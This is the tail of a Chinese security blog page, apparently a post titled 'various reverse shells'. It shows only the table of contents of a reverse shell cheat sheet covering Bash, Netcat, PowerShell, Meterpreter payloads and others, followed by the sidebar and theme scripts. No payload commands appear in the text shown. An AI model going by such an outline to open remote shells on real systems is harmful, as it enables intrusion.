class="toc-number">1.</span> <span class="toc-text">Reverse Shell Cheat Sheet</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Shell"><span class="toc-number">1.2.</span> <span class="toc-text">Reverse Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash-TCP"><span class="toc-number">1.2.1.</span> <span class="toc-text">Bash TCP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash-UDP"><span class="toc-number">1.2.2.</span> <span class="toc-text">Bash UDP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Socat"><span class="toc-number">1.2.3.</span> <span class="toc-text">Socat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl"><span class="toc-number">1.2.4.</span> <span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">1.2.5.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">1.2.6.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby"><span class="toc-number">1.2.7.</span> <span class="toc-text">Ruby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Golang"><span class="toc-number">1.2.8.</span> <span class="toc-text">Golang</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Netcat-Traditional"><span class="toc-number">1.2.9.</span> <span class="toc-text">Netcat Traditional</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Netcat-OpenBsd"><span class="toc-number">1.2.10.</span> <span class="toc-text">Netcat OpenBsd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Netcat-BusyBox"><span class="toc-number">1.2.11.</span> <span class="toc-text">Netcat BusyBox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ncat"><span class="toc-number">1.2.12.</span> <span class="toc-text">Ncat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenSSL"><span class="toc-number">1.2.13.</span> <span class="toc-text">OpenSSL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell"><span class="toc-number">1.2.14.</span> <span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Awk"><span class="toc-number">1.2.15.</span> <span class="toc-text">Awk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java"><span class="toc-number">1.2.16.</span> <span class="toc-text">Java</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Java-Alternative-1"><span class="toc-number">1.2.16.1.</span> <span class="toc-text">Java Alternative 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Java-Alternative-2"><span class="toc-number">1.2.16.2.</span> <span class="toc-text">Java Alternative 2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#War"><span class="toc-number">1.2.17.</span> <span class="toc-text">War</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lua"><span class="toc-number">1.2.18.</span> <span class="toc-text">Lua</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NodeJS"><span class="toc-number">1.2.19.</span> <span class="toc-text">NodeJS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Groovy"><span class="toc-number">1.2.20.</span> <span class="toc-text">Groovy</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Groovy-Alternative-1"><span class="toc-number">1.2.20.1.</span> <span class="toc-text">Groovy Alternative 1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C"><span class="toc-number">1.2.21.</span> <span class="toc-text">C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dart"><span class="toc-number">1.2.22.</span> <span class="toc-text">Dart</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RevShells"><span class="toc-number">1.3.</span> <span class="toc-text">RevShells</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Meterpreter-Shell"><span class="toc-number">1.4.</span> <span class="toc-text">Meterpreter Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Staged-reverse-TCP"><span class="toc-number">1.4.1.</span> <span class="toc-text">Windows Staged reverse TCP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Stageless-reverse-TCP"><span class="toc-number">1.4.2.</span> <span class="toc-text">Windows Stageless reverse TCP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Staged-reverse-TCP"><span class="toc-number">1.4.3.</span> <span class="toc-text">Linux Staged reverse TCP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Stageless-reverse-TCP"><span class="toc-number">1.4.4.</span> <span class="toc-text">Linux Stageless reverse TCP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Other-platforms"><span class="toc-number">1.4.5.</span> <span class="toc-text">Other platforms</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spawn-TTY-Shell"><span class="toc-number">1.5.</span> <span class="toc-text">Spawn TTY Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fully-interactive-reverse-shell-on-Windows"><span class="toc-number">1.6.</span> <span class="toc-text">Fully interactive reverse shell on Windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.7.</span> <span class="toc-text">References</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/05/BUU-WEB-PWN-1/" title="BUU WEB PWN"><img data-lazy-src="/image/c8c4da32fdf24c299cd93506842bf570_c5_q75_864x486.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU WEB PWN"/></a><div class="content"><a class="title" href="/2021/08/05/BUU-WEB-PWN-1/" title="BUU WEB PWN">BUU WEB PWN</a><time datetime="2021-08-05T02:33:10.000Z" title="发表于 2021-08-05 10:33:10">2021-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/05/food/" title="food"><img data-lazy-src="/image/food.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="food"/></a><div class="content"><a class="title" href="/2021/08/05/food/" title="food">food</a><time datetime="2021-08-05T01:34:42.000Z" title="发表于 2021-08-05 09:34:42">2021-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/04/BUU-WEB-PWN/" title="BUU WEB PWN"><img data-lazy-src="/image/122.jfif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU WEB PWN"/></a><div class="content"><a class="title" href="/2021/08/04/BUU-WEB-PWN/" title="BUU WEB PWN">BUU WEB PWN</a><time datetime="2021-08-04T03:43:03.000Z" title="发表于 2021-08-04 11:43:03">2021-08-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/03/BUUWEB-PWN/" title="BUUWEB PWN"><img data-lazy-src="/image/O1CN01F47VwI1CKtclK8YP3_!!63-0-lubanu.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUWEB PWN"/></a><div class="content"><a class="title" href="/2021/08/03/BUUWEB-PWN/" title="BUUWEB PWN">BUUWEB PWN</a><time datetime="2021-08-03T01:15:36.000Z" title="发表于 2021-08-03 09:15:36">2021-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/02/BUUWEBPWN/" title="BUUWEBPWN"><img data-lazy-src="/image/O1CN01tnC3zS2E44SvBVaSc_!!1660208690.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUWEBPWN"/></a><div class="content"><a class="title" href="/2021/08/02/BUUWEBPWN/" title="BUUWEBPWN">BUUWEBPWN</a><time datetime="2021-08-02T03:14:38.000Z" title="发表于 2021-08-02 11:14:38">2021-08-02</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By upload</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.spacingElementById('content-inner')
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', '', 'katex-wrap')
  })
})()</script><script>if (document.getElementsByClassName('mermaid').length) {
  if (window.mermaidJsLoad) mermaid.init()
  else {
    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
      window.mermaidJsLoad = true
      mermaid.initialize({
        theme: 'neutral',
      })
      false && mermaid.init()
    })
  }
}</script><script>function loadValine () {
  function initValine () {
    let initData = {
      el: '#vcomment',
      appId: '',
      appKey: '',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'en',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick,mail'.split(','))
    }
    
    if (false) {
      const otherData = false
      initData = Object.assign({}, initData, otherData)
    }
    
    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
  else setTimeout(() => loadValine(), 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'http://upload.love/2021/07/17/%E5%90%84%E7%A7%8D%E5%8F%8D%E5%BC%B9shell/'
    this.page.identifier = '2021/07/17/各种反弹shell/'
    this.page.title = '各种反弹shell'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script>(function(d, w, c) {
    w.ChatraID = '';
    var s = d.createElement('script');
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments);
    };
    s.async = true;
    s.src = 'https://call.chatra.io/chatra.js';
    if (d.head) d.head.appendChild(s);
})(document, window, 'Chatra');

if (true) {
  var chatBtnFn = () => {
    var chatBtn = document.getElementById("chat_btn")
    chatBtn.addEventListener("click", function(){
      Chatra('openChat')
    });
  }
  chatBtnFn()
} else {
  if (true) {
    function chatBtnHide () {
      Chatra('hide')
    }
    function chatBtnShow () {
      Chatra('show')
    }
  }
}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>